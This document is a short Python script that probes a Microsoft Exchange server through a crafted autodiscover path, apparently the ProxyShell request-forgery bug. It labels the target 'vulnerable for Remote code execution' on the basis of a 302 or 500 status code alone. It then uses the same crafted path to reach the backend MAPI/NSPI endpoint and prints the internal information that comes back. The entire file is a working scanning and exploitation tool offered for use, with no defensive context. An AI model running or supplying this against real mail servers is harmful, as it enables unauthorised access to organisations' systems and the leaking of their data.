import requests, os
import argparse
from bs4 import BeautifulSoup
from urllib.parse import parse_qs, urlparse, unquote

s = requests.session()
parser = argparse.ArgumentParser()
parser.add_argument("--url", help="Target URL: mail.target.com")
args = parser.parse_args()
target = args.url
def check(target):

    r = s.get("https://"+target+"/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com")

    if r.status_code==302 or r.status_code==500:
        print("\nTarget seems vulnerable for Remote code execution!\n")
        print("Trying to get some more info\n--------------------------\n")
        rr = s.get("https://" + target + "/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com")
        soup = BeautifulSoup(rr.text, 'html.parser')
        for y in soup.find_all('p'):

            print(y.get_text()+"\n")
        print("\n")
    else:
        print(r.text)




check(target)
